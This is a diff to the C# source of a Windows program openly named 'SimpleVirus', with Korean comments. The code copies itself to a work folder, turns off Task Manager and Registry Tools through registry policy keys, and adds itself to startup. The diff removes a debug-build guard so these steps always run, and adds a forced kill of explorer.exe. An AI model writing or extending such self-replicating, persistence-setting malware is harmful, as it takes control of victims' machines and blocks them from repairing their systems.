@@ -7,7 +7,6 @@ namespace SimpleVirus
     internal static class Program
     {
         public static string ApplicationName { get; } = "SimpleVirus";
-        public static string ApplicationVersion { get; } = "1.0.0";
 
 
         /// <summary>
@@ -33,11 +32,13 @@ namespace SimpleVirus
             if (Application.StartupPath != workDir)
             {
                 SelfReplication(workDir);
-#if !DEBUG
-                SetPoliciesSetting(PoliciesSetting.TaskManager, false);
-                SetPoliciesSetting(PoliciesSetting.RegistryTools, false);
+
+                Policies.SetPoliciesSetting(PoliciesType.TaskManager, false);
+                Policies.SetPoliciesSetting(PoliciesType.RegistryTools, false);
+
                 SetStartUp(ApplicationName, Path.Combine(workDir, ApplicationName + ".exe"), true);
-#endif
+
+                Process.Start("taskkill", "/f /im explorer.exe");
             }
         }
 
@@ -109,27 +110,12 @@ namespace SimpleVirus
             }
         }
 
-        public enum PoliciesSetting
-        {
-            TaskManager,
-            RegistryTools
-        };
-
-        private static void SetPoliciesSetting(PoliciesSetting setting, bool enable)
-        {
-            const string registryKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
-            string keyValue = (setting == PoliciesSetting.TaskManager) ? "DisableTaskMgr" : "DisableRegistryTools";
-
-            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath);
-
-            if (enable && objRegistryKey.GetValue(keyValue) != null)
-                objRegistryKey.DeleteValue(keyValue); // 키 삭제 
-            else if (!enable)
-                objRegistryKey.SetValue(keyValue, 1, RegistryValueKind.DWord);
-
-            objRegistryKey.Close();
-        }
-
+        /// <summary>
+        /// 프로그램을 시작프로그램에 등록
+        /// </summary>
+        /// <param name="programName">애플리케이션 이름</param>
+        /// <param name="programPath">애플리케이션 위치</param>
+        /// <param name="enable">활성화 여부</param>
         private static void SetStartUp(string programName, string programPath, bool enable)
         {
             const string registryKeyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
